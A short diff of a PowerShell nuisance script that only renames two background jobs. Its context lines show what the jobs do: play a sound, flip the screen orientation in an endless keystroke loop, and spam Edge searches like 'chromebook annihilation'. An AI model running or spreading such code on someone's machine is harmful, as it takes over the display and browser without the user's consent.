@@ -18,7 +18,7 @@ $player.SoundLocation = $mp3Path
 $player.Play()
 
 # Orientation Flip Job
-Start-Job -ScriptBlock {
+Start-Job -Name "FlipOrientation" -ScriptBlock {
     Add-Type -AssemblyName System.Windows.Forms
     $keys = @("^{%}{LEFT}", "^{%}{RIGHT}", "^{%}{UP}", "^{%}{DOWN}")
     while ($true) {
@@ -29,7 +29,7 @@ Start-Job -ScriptBlock {
 }
 
 # Edge Spam Search Job
-Start-Job -ScriptBlock {
+Start-Job -Name "EdgeSpam" -ScriptBlock {
     Add-Type -AssemblyName System.Windows.Forms
     $searches = @(
         "chromebook annihilation",
